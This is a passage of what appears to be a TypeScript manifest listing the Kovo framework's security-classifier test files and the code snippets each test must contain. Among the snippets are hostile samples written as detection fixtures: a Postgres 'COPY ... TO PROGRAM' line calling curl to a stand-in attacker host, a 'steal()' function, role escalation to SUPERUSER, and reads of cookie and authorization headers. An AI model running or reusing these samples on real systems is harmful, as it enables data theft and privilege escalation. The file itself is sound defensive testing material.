        snippets: [
          'assertSafeTransportResponseHeaderEntries',
          'expectAdapterTransportHeaderRejection',
          "for (const httpVersion of ['1.0', '1.1', '2.0'])",
        ],
      },
      {
        id: 'static-export-transport-policy',
        file: 'packages/server/src/static-export-headers.test.ts',
        snippets: ['rejects transport-owned framing and hop-by-hop static metadata with KV415'],
      },
      {
        id: 'real-http-header-reconstruction-oracle',
        file: 'packages/server/src/http-header-roundtrip-property-oracle.test.ts',
        snippets: [
          'real HTTP header reconstruction property oracle',
          'keeps live and generated Node reconstruction identical for hostile header families',
          'Web Headers owns raw control rejection before Kovo receives a Response',
        ],
      },
    ],
  },
  {
    id: 'structured-app-response-headers',
    marker: '@kovo-security-classifier-corpus structured-app-response-headers',
    testFiles: [
      'packages/server/src/response-app-headers.test.ts',
      'packages/server/src/response.test.ts',
      'packages/server/src/app-document.test.ts',
      'packages/server/src/api/app.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'exact-runtime-and-public-type-set',
        file: 'packages/server/src/response-app-headers.test.ts',
        snippets: [
          'keeps the exact runtime allowlist aligned with the public type-level set',
          "'cache-control'",
          "'last-modified'",
          "'vary'",
          'MissingAppResponseHeaderName',
        ],
      },
      {
        id: 'remote-derived-route-outcomes',
        file: 'packages/server/src/response.test.ts',
        snippets: [
          'rejects remote-derived names outside the structured app response allowlist',
          "'X-Accel-Redirect'",
          "'Access-Control-Allow-Origin'",
        ],
      },
      {
        id: 'configured-error-shell-boundary',
        file: 'packages/server/src/app-document.test.ts',
        snippets: [
          'fails remote-derived error-shell header names closed with KV415',
          'outside the direct allowlist',
        ],
      },
      {
        id: 'public-api-allowlist',
        file: 'packages/server/src/api/app.test.ts',
        snippets: [
          'RootAppResponseHeaderName',
          'rejectedRootAppResponseHeaders',
          "'X-Accel-Redirect'",
        ],
      },
    ],
  },
  {
    id: 'kv418-request-authority',
    marker: '@kovo-security-classifier-corpus kv418-request-authority',
    testFiles: ['packages/compiler/src/scan/parse.test.ts'],
    verdictAnchors: [
      {
        id: 'direct-alias-dynamic-enumeration',
        file: 'packages/compiler/src/scan/parse.test.ts',
        snippets: [
          "request.headers.get('COOKIE')",
          'const req = request',
          'input.headerName',
          'Object.fromEntries(headers)',
        ],
      },
      {
        id: 'wrapped-rest-arguments-and-mutable-names',
        file: 'packages/compiler/src/scan/parse.test.ts',
        snippets: [
          "handler: ((_input, request) => request.headers.get('cookie'))",
          "let name = 'x-signature'",
          'arguments[1].headers',
          'handler: (...args)',
          "const name = 'cookie'",
        ],
      },
      {
        id: 'uninspectable-handlers-and-unresolved-keys',
        file: 'packages/compiler/src/scan/parse.test.ts',
        snippets: [
          'handler: referencedHandler',
          '{ ...sharedOptions }',
          "const runtimeKey = 'machine/runtime'",
          'unresolvedName: true',
        ],
      },
    ],
  },
  {
    id: 'kv424-request-process',
    marker: '@kovo-security-classifier-corpus kv424-request-process',
    testFiles: [
      'packages/cli/src/phase3c-semantic-bridge-adversarial.test.ts',
      'packages/drizzle/src/capability-escapes-static.test.ts',
      'packages/drizzle/src/trust-escapes-static.test.ts',
      'packages/drizzle/src/trust-escapes-static-temporal-integration.test.ts',
      'packages/drizzle/src/index.toctou-readonly.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'compiler-semantic-context-raw-read-consistency',
        file: 'packages/cli/src/phase3c-semantic-bridge-adversarial.test.ts',
        snippets: [
          'keeps a const-bound trustedSql rawRead closed without a compiler-owned semantic edge',
          "const db = context?.db;",
          'const statement = trustedSql(',
          "{ reads: ['contacts'] }",
          "db['rawRead']",
          'const rawRead = db.rawRead;',
          'expect(hasRequestProcessClosure(files, semanticSources)).toBe(true)',
        ],
      },
      {
        id: 'static-build-task-b-authoritative-consistency',
        file: 'packages/drizzle/src/capability-escapes-static.test.ts',
        snippets: [
          'matches standalone TASK B facts through $label',
          'a local framework-factory re-export',
          'a namespace alias',
          'a computed callback property',
          'a spread callback record',
          'a conditionally projected root factory',
          'expect(collectStaticBuildTrustFactsFromProject({ files })).toEqual(standalone)',
        ],
      },
      {
        id: 'existing-dangerous-sink-closed-verdicts',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'el.innerHTML = userInput',
          'document.write(markup)',
          'setTimeout("doThing()", 100)',
          'new Function("return 1")',
        ],
      },
      {
        id: 'compiler-semantic-helper-proof-is-source-bound-and-fail-closed',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'uses only byte-and-span-bound compiler summaries to discharge nested request-helper noise',
          'compilerSecuritySemanticSources',
          'callableSpan',
          'byteMismatched',
          "verdict: 'closed' as const",
          'callable identity mismatch',
          'authority category mismatch',
          'root family mismatch',
          'multiple root identities for one helper',
          'same-span closed sibling summary',
          'closed root trace',
        ],
      },
      {
        id: 'process-import-and-request-surface-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'execFileSync as runFile',
          'const { spawnSync: runSpawn } = processApi',
          'required.fork(input.module)',
          'request-handler.opaque-package-call',
        ],
      },
      {
        id: 'dynamic-code-server-root-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'await import(input.module)',
          'new vm.Script(input.code)',
          'runInNewContext: execute',
        ],
      },
      {
        id: 'aliased-code-timer-and-module-resolution-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'Reflect.apply(moduleEval',
          'later(input.code, 1)',
          'process.getBuiltinModule',
          'createRequire(import.meta.url)',
          'require(input.module)',
        ],
      },
      {
        id: 'filesystem-path-and-reference-escape-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'readFileSync as read',
          'requiredPath[request.method]',
          '[input.value].map(execFileSync)',
          'Reflect.apply(execFileSync',
          'child[input.method]',
        ],
      },
      {
        id: 'filesystem-and-node-builtin-census-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          "expect.arrayContaining(['mkdtempDisposableSync', 'openAsBlob', 'readFileSync'])",
          "expect.arrayContaining(['inspector', 'process', 'sqlite'])",
          'fails closed over every unreviewed Node builtin namespace',
        ],
      },
      {
        id: 'adjacent-process-runtime-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'Worker as Thread',
          'cluster.fork()',
          'Bun.spawn([input.code])',
          'new Deno.Command(input.code)',
        ],
      },
      {
        id: 'environment-and-request-credential-wire-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'const viteEnvironment = import.meta.env',
          'processEnvironment = nodeProcess.env',
          "import { serverSecret } from './config.js'",
          "request.headers.get('COOKIE')",
          "context.request.headers.get('authorization')",
          "request.headers.get('Proxy-Authorization')",
          'return Object.fromEntries(headers)',
          'result.token = get(input.headerName)',
          'token: reveal(context.request)',
          "import { reveal, safeUrl } from './helper.js'",
          'token?.slice(0, 4)',
          'alias.token = request.headers.get',
          'fill(result, request)',
          'revealDestructured(request)',
          'request.headers.forEach((value, name)',
          'request.headers.entries()) result[name] = value',
        ],
      },
      {
        id: 'reviewed-context-fetch-response-provenance',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'permits governed fetch/Response body flow but rejects forwarding ambient credentials',
          "const response = await context.fetch('https://api.example.test/data')",
          'return { value: await cloned.json() }',
          'keeps contextual fetch provenance exact across aliases, mutation, and computed calls',
          "await context['fetch']('https://api.example.test/computed')",
          'const alias = context;',
          'const remote = context.fetch;',
          'context.fetch = async () =>',
          "response['clone']().json()",
        ],
      },
      {
        id: 'framework-owned-file-storage-controls',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          "context.storage.get('fixed-key')",
          'respond.stream(context.stream',
          "respond.file('safe'",
        ],
      },
      {
        id: 'stored-file-retained-authority-exact-grammar',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'keeps exact stored-file parsing separate from opaque storage authority',
          '.maxBytes(2_000_000)',
          ".accept(['image/png'])",
          "const schema = s.file().store({ keyPrefix: 'receipts', storage: exactStorage })",
          "'computed maxBytes refinement'",
          "'computed accept refinement'",
          "'aliased builder'",
          "'dynamic maxBytes'",
          "'dynamic acceptance'",
          "'exported storage'",
          "'aliased storage'",
          "'computed storage member'",
          "'mutated storage property'",
          "'structural storage capability'",
          "'post-construction escape'",
          "'multiple retained consumers'",
        ],
      },
      {
        id: 'memory-storage-direct-method-exact-grammar',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'accepts exact direct memory-storage methods without opening capability carriers',
          "await storage.put('receipts/delete-target.txt', 'delete target')",
          "await storage.delete('receipts/delete-target.txt')",
          "await storage.get('receipts/write-target.txt')",
          "'aliased binding'",
          "'computed method'",
          "'extracted method'",
          "'reassigned method'",
          'export const storage = createMemoryStorage()',
          'declare const storage:',
          "storage.put('receipts/proof.txt', execFileSync('storage-module-authority'))",
          "Promise.resolve().then(() => storage.put('receipts/query-write.txt', 'bad'))",
        ],
      },
      {
        id: 'memory-storage-direct-method-query-write-denial',
        file: 'packages/drizzle/src/index.toctou-readonly.test.ts',
        snippets: [
          'flags query() loaders that reach storage put/delete authority',
          'import { createMemoryStorage, query } from "@kovojs/server";',
          'const storage = createMemoryStorage();',
          'operationProvenance',
        ],
      },
      {
        id: 'request-minted-framework-authority-superset',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'rootedFiles(input.root)',
          'createFileSystemStorage({ root: input.root })',
          'createS3CompatibleStorage(input.storage)',
          'commandAllowlist([input.program]',
          'cmd(input.program, input.argv',
          'server[input.exportName]',
        ],
      },
      {
        id: 'trusted-assign-audited-escape-closed-grammar',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'admits only exact audited trustedAssign calls while retaining nested closed verdicts',
          "trustedAssign(opaque(input.email), 'reviewed grant')",
          "trustedAssign(process.env.CONTACT_ID, 'reviewed grant')",
          "server.trustedAssign(input.email, 'reviewed grant')",
          'const grant = trustedAssign;',
          "trustedAssign(input.email, { ['reason']: 'reviewed grant' })",
          "trustedAssign(input.email, { reason: 'reviewed grant', reason: 'again' })",
        ],
      },
      {
        id: 'module-scope-authority-controls',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          "rootedFiles('/srv/kovo/files')",
          "createFileSystemStorage({ root: '/srv/kovo/storage' })",
          "commandAllowlist(['/usr/bin/true']",
          "cmd('/usr/bin/true', [], { allow })",
        ],
      },
      {
        id: 'closed-call-graph-and-safe-call-controls',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'makeRunner()(input.value)',
          'helpers[input.method](input.value)',
          'runner.run(input.value)',
          'return callback(value)',
          '[body].map((value) => String(value).trim())',
          'await request.text()',
        ],
      },
      {
        id: 'generated-auth-environment-exact-grammar',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'accepts only the exact pristine Better Auth CSRF environment derivation grammar',
          "betterAuthCsrfFromEnvironment({ field: 'csrf', sessionId() { return 'global'; } })",
          'accepts only exact Better Auth environment binding option records',
          '<request-scoped-framework-setup>',
          'createBetterAuthSqliteBindingsFromEnvironment',
          'await appRuntimeDbReady;',
          'bindings.seedDemoUser',
          'export const appSeedDemoUser = bindings.seedDemoUser;',
          'class SeedAtBoot { static { void bindings.seedDemoUser(); } }',
        ],
      },
      {
        id: 'complete-generated-runtime-auth-query-closure',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'accepts the complete generated runtime, auth, and source-derived query closure',
          "starterTemplateSource('queries.ts')",
          'appRuntimeMutationReplayStore',
          'Postgres generated closure',
          'SQLite generated closure',
          "(contactsQuery as { key: string }).key = 'forged'",
          'forged-runtime-provider',
        ],
      },
      {
        id: 'named-query-context-owned-raw-read-closure',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'accepts a source-derived query returning an exact context-owned rawRead result',
          'export const contactsQuery = query({',
          'const db = context?.db;',
          "{ reads: ['contacts'] }",
          "db['rawRead']",
          'const rawRead = db.rawRead;',
        ],
      },
      {
        id: 'generated-runtime-constructor-and-pristine-data-closure',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'accepts only the exact declarative SQLite app runtime constructor grammar',
          'function getTables() { return APP_TABLES; }',
          'let escaped; escaped = APP_TABLES',
          'class Tables { get value() { return APP_TABLES; } }',
          'function* seeds() { yield APP_SEED; }',
          'class StaticHolder { static value = APP_TABLES; }',
          'class Holder { value = APP_SEED; }',
          'keeps generated database and auth setup constructors at module initialization',
          'postgresAppRuntimeOptions({',
          'class Holder { static value = appRuntimeSchema; }',
          'export default appRuntimeSchema;',
          'export const escapedSchema = <Carrier value={appRuntimeSchema} />;',
          'principalFromRequest(request)',
          "request.headers.get('x-user')",
          "COPY (SELECT current_user) TO PROGRAM 'curl https://attacker.invalid'",
          'CREATE FUNCTION steal() RETURNS void',
          'CREATE EXTENSION file_fdw',
          'GRANT kovo_system TO public',
          'ALTER ROLE kovo_app WITH SUPERUSER',
        ],
      },
      {
        id: 'drizzle-authz-policy-and-generated-auth-schema-provenance',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'keeps the stock rate-limit authorization declaration on exact table provenance',
          'authzPolicy: sql`false`',
          'authzPolicy: copiedSql`false`',
          '[policyKey]: sql`false`',
          'export const authSchema = { user, session, account, verification, rateLimit };',
        ],
      },
      {
        id: 'generated-retained-key-unary-and-jsx-helper-closure',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'treats only inert logical-not as a non-mutating retained-config unary use',
          "for (const operator of ['+', '-', '~'])",
          'accepts only the pristine generated contacts query key as an optimistic computed key',
          '[${computedKey}](draft, input)',
          "execFileSync('helper-callback')",
          "execFileSync('helper-getter')",
          "execFileSync('helper-proxy')",
          'keeps exact boot-setup memo verdicts scoped to one source-program analysis',
        ],
      },
      {
        id: 'internal-postgres-capability-remains-opaque',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'does not grant app code raw Postgres DB authority through the internal subpath',
          "from '@kovojs/server/internal/postgres-capability'",
          'rawDb.execute(input.sql)',
          '<opaque-module-initializer:@kovojs/server/internal/postgres-capability>',
        ],
      },
      {
        id: 'reusable-posture-scope-closed-grammar',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'keeps reusable posture-scope bindings on a finite closed composition grammar',
          "const principal = context.actAs('reusable-reviewed-principal')",
          "const systemRead = context.declareSystemRead('read-only reconciliation proof')",
          "const systemWrite = context.declareSystemWrite('write reconciliation proof')",
          'const alias = principal;',
          'const { runMutation } = principal;',
          'queueMicrotask(() => { void principal.runMutation',
          'Object.setPrototypeOf(principal, null);',
          "await context.declareSystemRead('read only').runMutation",
          "await context.declareSystemWrite('write only').runQuery",
          "await context.actAs('reviewed').schedule",
        ],
      },
      {
        id: 'composition-deferred-class-boundary',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'rejects composition and scheduling across deferred class execution boundaries',
          'class DeferredTaskMutation',
          'const DeferredWebhookMutation = class',
          'queueMicrotask(() => { void new this(); });',
          'readonly directResult = context.runMutation',
          ".actAs('reviewed-inline-principal')",
          'readonly scheduled = context.schedule',
          'class DeferredMutationSchedule',
          'readonly cancelled = request.cancel(handle)',
        ],
      },
      {
        id: 'exact-root-allowlist-deferred-class-boundary',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'rejects every exact root allowlist across deferred class execution boundaries',
          'class DeferredInvalidate',
          'readonly result = context.invalidate(orders)',
          'class DeferredRecordChange',
          'readonly result = context.recordChange(orders',
          'class DeferredTaskMap',
          'readonly result = attempts.set(input.id, 1)',
          'class DeferredHelper',
          'readonly result = writeContact(request, { email })',
        ],
      },
      {
        id: 'root-authority-deferred-class-boundary',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'rejects deferred root authority while keeping the same immediate calls accepted',
          'class DeferredDbWrite',
          'request.db.insert(contacts).values',
          'class DeferredDbRead',
          'context.db.select({ id: contacts.id }).from',
          'class DeferredEndpointIo',
          'readonly body = request.text()',
          "readonly stored = context.storage.get('fixed-key')",
          'class DeferredFetch',
          "context.fetch('https://example.test/deferred')",
          'class DeferredGlobalFetch',
          "fetch('https://example.test/deferred-global')",
          'class DeferredRunCommand',
          'readonly result = runCommand(command)',
          'class DeferredFetchResponse',
          'readonly body = response.text()',
          'class DeferredWebhookAuthority',
          'context.tx.insert(contacts).values',
          "context.fail('deferred'",
          'class DeferredOutcomeAuthority',
          "context.setCookie?.('proof', '1')",
          "endpoint('/immediate-io'",
          "task('orders/immediate-fetch'",
          "task('orders/immediate-command'",
          'class DeferredManagedRead',
          'readonly rows = readonlyAppDb.select',
        ],
      },
      {
        id: 'class-value-assimilation-boundary',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'refuses transparent class values at framework assimilation boundaries',
          "task('classes/direct'",
          'return { value: DeferredValue }.value',
          'return [DeferredValue][0]',
          'const { value } = { value: DeferredValue }',
          'const [value] = [DeferredValue]',
          'class DeferredLateAuthority',
          "context.storage.get('after-settlement')",
          'refuses helper, container, reflective, and native-Promise class assimilation',
          'identity helper',
          'return Promise.resolve(1).then(() => [DeferredValue].at(0))',
          'follows imported helper and re-export outputs into class assimilation',
          'return identity(DeferredValue)',
          'fails closed for classes with assigned, descriptor, and inherited then hooks',
          'applies JavaScript-exact default and rest bindings at thenable assimilation sites',
          'return reveal(undefined)',
          'return Promise.resolve(undefined).then((value = DeferredValue) => value)',
          'follows default bindings through named, default, and re-exported helpers',
          'follows local class heritage for static assimilation projections',
          'static value = DeferredValue',
          'keeps call-site-bound thenable helper proof within a bounded scaling envelope',
          'resolves returned class values through import and re-export aliases',
          "export { NamedDeferred as RenamedDeferred } from './classes.js'",
          "export { default } from './classes.js'",
          'keeps non-assimilated local work and exact framework outcomes open',
          'class ImmediateValue { readonly value = pureHelper(); }',
          'cache[input.key] = 1',
          "return redirect('/login', {})",
        ],
      },
      {
        id: 'local-map-assimilation-carrier-boundary',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'opens exact local Map reads while retaining stored thenable assimilation',
          "values.set('key', DeferredValue)",
          "values.set('key', values.get('key'))",
          "left.set('key', right.get('key'))",
          "right.set('key', left.get('key'))",
          'const chainLength = 70',
          "source: '<class-thenable:DeferredValue>'",
        ],
      },
      {
        id: 'trusted-input-mutation-and-authored-result-boundary',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'invalidates trusted input roles after direct, reflective, loop, and helper writes',
          "Object.defineProperty(input, 'value'",
          "Reflect.set(input, 'value'",
          'aliased helper escape',
          'object-method helper escape',
          'nested aggregate helper escape',
          'aggregate carrier write',
          'array carrier write',
          'destructured projection write',
          'projection alias write',
          'derives input callback, inserted-value, and string-protocol results from authored outputs',
          'input.values.concat',
          'input.values.flatMap',
          'input.values.reduceRight',
          'input.values.toSpliced',
          'input.values.with',
          '[Symbol.replace]()',
          'keeps immutable input projections open while retaining opaque carrier controls',
          "task('root-input/call-site-safe'",
          "source: 'mutate'",
          'copies exact mutation number-schema projections without opening adjacent carriers',
          'state.count += input.quantity',
          'object-valued schema',
          'non-literal number default',
          'written scalar projection',
          'invalidates trusted roots through reference-preserving Array call results',
          'input.items.findLast',
          'input.items.filter',
          'input.items.reduce',
          'input.items.map',
          'input.items.flatMap',
          "Object.defineProperty(alias, 'value'",
          "Reflect.set(alias, 'value'",
          'invalidates trusted roots through shallow iterable and local-helper carriers',
          'input.items.toSorted',
          '[...input.items][0]',
          'Array.of(...input.items)',
          '[...new Set(input.items)]',
          'const [alias] = identity(input.items[0]!)',
          'keeps copied Array containers and fresh callback results out of the root alias set',
          'fresh reduce accumulator',
          'keeps shallow carrier containers and fresh helper outputs out of the root alias set',
          "copy[0] = { value: 'replacement' }",
          'keeps opaque and cyclic local-helper carrier results fail closed',
          'keeps four hundred unrelated alias-plan safe misses bounded and fail closed',
          'request-handler.provenance-budget',
        ],
      },
      {
        id: 'temporal-prototype-and-local-target-boundary',
        file: 'packages/drizzle/src/trust-escapes-static-temporal-integration.test.ts',
        snippets: [
          'C2 rejects %s',
          'Object.setPrototypeOf with a class',
          '__proto__ assignment on a plain thenable',
          'keeps an ordinary local destructured mutation helper open',
          'keeps an unresolved %s reflective target closed',
          "'validated input'",
          "'Proxy'",
          "'exported helper parameter'",
        ],
      },
      {
        id: 'authored-session-provider-class-boundary',
        file: 'packages/drizzle/src/trust-escapes-static.test.ts',
        snippets: [
          'const deferredAuthoredProvider = sinksForFiles(',
          'class DeferredSessionProvider',
          'readonly result = bindings.sessionProvider(request)',
          "source: 'bindings.sessionProvider'",
        ],
      },
    ],
  },
  {
    id: 'kv424-request-global-member-lockdown',
    marker: '@kovo-security-classifier-corpus kv424-request-global-member-lockdown',
    testFiles: [
      'packages/drizzle/src/trust-escapes-static-global-member-lockdown.test.ts',
      'packages/drizzle/src/trust-escapes-static-temporal-final-review.test.ts',
      'packages/drizzle/src/trust-escapes-static-temporal-integration.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'exact-global-member-replacement-superset',
        file: 'packages/drizzle/src/trust-escapes-static-global-member-lockdown.test.ts',
        snippets: [
          'rejects an Object.defineProperty replacement of %s.%s',
          "['Promise', 'resolve', 'Promise.resolve()', 'Promise.resolve']",
          "['Response', 'json', 'Response.json({ ok: true })', 'Response.json']",
          "['Array', 'isArray', 'Array.isArray([])', 'Array.isArray']",
          "['JSON', 'stringify', 'JSON.stringify({ ok: true })', 'JSON.stringify']",
          'rejects a reviewed member changed through %s',
          'rejects an aliased and cross-module Promise.resolve replacement',
          "export { promiseNamespace as runtimePromise } from './intrinsic-alias.js'",
          'rejects an ordinary object carrier changed through %s',
          'dynamic namespace and member keys',
          'rejects a namespace reached through an object destructuring alias',
          'rejects destructured global namespace and mutation-method aliases',
          'keeps folded %s mutation authority fail closed',
          "globalThis['Ob' + 'ject']",
          "globalThis['Re' + 'flect']",
          "const { ['define' + 'Property']: replace } = namespace",
          'computed-binding Object.defineProperty',
          'const-key Object.defineProperty',
          'keeps a const-aliased folded local member name open',
          'rejects a namespace reached through a %s array projection',
          '[Promise][0]!.resolve',
          'object destructuring assignment target',
          'nested destructuring assignment target',
          'for-of direct target',
          'for-in direct target',
          'for-await direct target',
          'for-of nested object target',
          'for-await nested array target',
          'fails closed when exact namespace provenance exhausts the traversal depth',
          'keeps pristine reviewed members and local lookalikes open',
          'keeps finite object, array, and destructuring carriers of local lookalikes open',
          'rejects a namespace installed through %s',
          'Object.defineProperty getter carrier installation',
          'Reflect.setPrototypeOf carrier installation',
          'rejects a namespace reached through a %s',
          'logical assignment result',
          'rejects a namespace reaching a %s',
          'destructured for-of binding',
          'rejects a namespace passed into a local mutation helper',
          'rejects a namespace substituted into an authored callback parameter',
          'rejects a namespace reached through Array.%s',
          'shifted slice',
          'EXACT_GLOBAL_ARRAY_CARRIER_CASES',
          "'findLast'",
          "'filter'",
          "'reduce'",
          "'reduceRight'",
          'rejects all four exact members reached through the reviewed Array %s carrier/result',
          'EXACT_GLOBAL_ITERABLE_CARRIER_CASES',
          'rejects all four exact members reached through %s',
          'fails closed when exact Array.of carrier semantics are authored-mutable',
          'tracks Set duplicate collapse for indexed reads and destructuring',
          'tracks a later custom-iterator yield that can occupy the first materialized slot',
          'rejects Promise flowing through %s',
          'rest parameter indexed read',
          'object-destructured aliased parameter default',
          'keeps iterable carriers, call spreads, and parameter patterns open for local lookalikes',
          'copiedGlobalIsNotGlobal',
          'copiedPromise',
          'keeps an opaque iterable %s fail closed',
          'opaqueTuple',
          'keeps every reviewed Array carrier/result method open for local lookalikes',
          'canonicalizes %s numeric carrier keys',
          'rejects Promise passed through an imported %s mutation wrapper',
          'default-as-named barrel',
          'keeps an authored getter returning a local lookalike from poisoning the global member',
          'keeps reusable callback-helper substitution bound to the actual safe invocation',
          'closes reusable callback-helper substitution at the actually poisoned invocation',
          'keeps diamond alias provenance bounded',
          'keeps 120 distinct iterable and parameter-pattern safe misses bounded',
          'indexes 400/800 distinct exact-global helper safe misses with near-linear bounded scaling',
          'retainDistinctSafeMissCalls',
        ],
      },
      {
        id: 'temporal-class-and-root-provenance-superset',
        file: 'packages/drizzle/src/trust-escapes-static-temporal-final-review.test.ts',
        snippets: [
          'temporal final adversarial review',
          'C1 rejects a Promise carrier through %s',
          'C2 rejects a class-derived thenable through %s',
          'C3 invalidates the root through a %s alias',
          'keeps one hundred twenty unrelated safe class carriers within the provenance budget',
          'performance.now() - startedAt',
          'toBeLessThan(8_000)',
        ],
      },
      {
        id: 'class-static-exact-global-carrier-superset',
        file: 'packages/drizzle/src/trust-escapes-static-temporal-integration.test.ts',
        snippets: [
          'C1 preserves Promise identity through a class %s',
          'own static getter',
          'inherited static field',
          'Reflect.set static field',
          'defineProperties static field',
          'computed static field',
          'reassigned computed descriptor field',
          'deleted static shadow',
          'fails closed for a reassigned computed class-static carrier',
          'does not inherit a shadowed unsafe static %s',
          'does not apply a later class-static %s to an earlier local write',
        ],
      },
    ],
  },
  {
    id: 'mutation-form-project-provenance',
    marker: '@kovo-security-classifier-corpus mutation-form-project-provenance',
    testFiles: [
      'packages/compiler/src/scan/project-mutation-bindings.test.ts',
      'packages/compiler/src/mutation-form-ownership-security.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'exact-stock-project-provenance-positive-control',
        file: 'packages/compiler/src/scan/project-mutation-bindings.test.ts',
        snippets: [
          'accepts stock mutation and generated Better Auth forms through exact relative chains',
          "key: 'mutations/add-contact'",
          "key: 'auth/sign-in'",
          "key: 'auth/sign-out'",
        ],
      },
      {
        id: 'alias-namespace-computed-lookalike-closed',
        file: 'packages/compiler/src/scan/project-mutation-bindings.test.ts',
        snippets: [
          'renamed import alias stays closed',
          'namespace import stays closed',
          'computed generated projection stays closed',
          'structural mutation lookalike stays closed',
          'renamed re-export alias stays closed',
        ],
      },
      {
        id: 'missing-cycle-mutation-wrapper-and-collision-closed',
        file: 'packages/compiler/src/scan/project-mutation-bindings.test.ts',
        snippets: [
          'missing relative target stays closed',
          'cyclic named re-export stays closed',
          'mutated generated binding carrier stays closed',
          'aliased generated binding carrier stays closed',
          'wrapper around generated constructor stays closed',
          'closes every binding when distinct terminal definitions claim one key',
        ],
      },
      {
        id: 'path-scoped-structural-lookalike-closed',
        file: 'packages/compiler/src/scan/project-mutation-bindings.test.ts',
        snippets: [
          'keeps a structural registry fact path-scoped to its exact component file',
          "fileName: 'components/forged.tsx'",
          "code: 'KV242'",
        ],
      },
      {
        id: 'typed-form-subtree-scope-and-reviewed-button-control',
        file: 'packages/compiler/src/mutation-form-ownership-security.test.ts',
        snippets: [
          'scopes stock route, list, and reviewed Button expressions to their actual form owner',
          'structural definition.render lookalike nested in the form',
          'reviewed Button spread nested in the form',
          'reviewed Button form reassociation nested in the form',
          'opaque expression nested in the form',
          'keeps an unresolved explicit form-association carrier closed outside the form',
        ],
      },
    ],
  },
  {
    id: 'client-handler-import',
    marker: '@kovo-security-classifier-corpus client-handler-import',
    testFiles: [
      'packages/compiler/src/client-handler-boundary-security.test.ts',
      'packages/compiler/src/client-handler-import-policy.test.ts',
      'packages/compiler/src/component-event-boundary-registry.test.ts',
      'packages/compiler/src/handler-lowering.test.ts',
    ],
    verdictAnchors: [
      {
        id: 'published-data-never-grants-import-authority',
        file: 'packages/compiler/src/client-handler-boundary-security.test.ts',
        snippets: [
          'publishToClient value-only executable boundary',
          'array destructuring alias',
          'container member invocation',
          'higher-order Promise callback',
          'preserves an audited non-callable value',
          'never emits an imported module for a published value assertion',
          'snapshots one pristine same-file const',
        ],
      },
      {
        id: 'client-handler-dynamic-code-closed',
        file: 'packages/compiler/src/client-handler-boundary-security.test.ts',
        snippets: [
          'client-handler dynamic-code boundary',
          'async-generator constructor',
          'constant-folded constructor property',
          'reflective descriptor extraction',
          'browser string-timer code',
        ],
      },
      {
        id: 'jsx-intrinsic-component-lexical-boundary',
        file: 'packages/compiler/src/client-handler-boundary-security.test.ts',
        snippets: [
          'JSX intrinsic/component lexical boundary',
          'leading underscore',
          'non-ASCII lower-case letter',
          'CJK identifier',
          'preserves intrinsic host grammar',
        ],
      },
      {
        id: 'node-and-loader-authority-closed',
        file: 'packages/compiler/src/client-handler-import-policy.test.ts',
        snippets: [
          "import { execFileSync } from 'node:child_process'",
          'dynamic import',
          'CommonJS require',
          'TypeScript import equals',
          'import.meta authority',
        ],
      },
      {
        id: 'node-fetch-method-identity-closed',
        file: 'packages/server/src/__bugz_remote_ingress.test.ts',
        snippets: [
          'node-fetch-method-identity-closed',
          "request('post')",
          "request('PoSt')",
          "request('POST')",
          "observedMethods).toEqual(['POST'])",
        ],
      },
      {
        id: 'node-fetch-authority-identity-closed',
        file: 'packages/server/src/__bugz_remote_ingress.test.ts',
        snippets: [
          'node-fetch-authority-identity-closed',
          "request('%65xample.com')",
          "request('app.example:8443')",
          "request('[2001:db8::1]:8443')",
          'expect(observed).toHaveLength(2)',
        ],
      },
      {
        id: 'alias-wrapper-and-host-spread-closed',
        file: 'packages/compiler/src/client-handler-import-policy.test.ts',
        snippets: [
          'module alias',
          'module wrapper',
          'inline host spread',
          'module host spread',
          'blocks every handler sharing a globally withheld binding',
        ],
      },
      {
        id: 'reviewed-function-dynamic-authority-closed',
        file: 'packages/compiler/src/client-handler-import-policy.test.ts',
        snippets: [
          'constructor property',
          'computed constructor property',
          'prototype constructor',
        ],
      },
      {
        id: 'canonical-and-audited-positive-controls',
        file: 'packages/compiler/src/client-handler-import-policy.test.ts',
        snippets: [
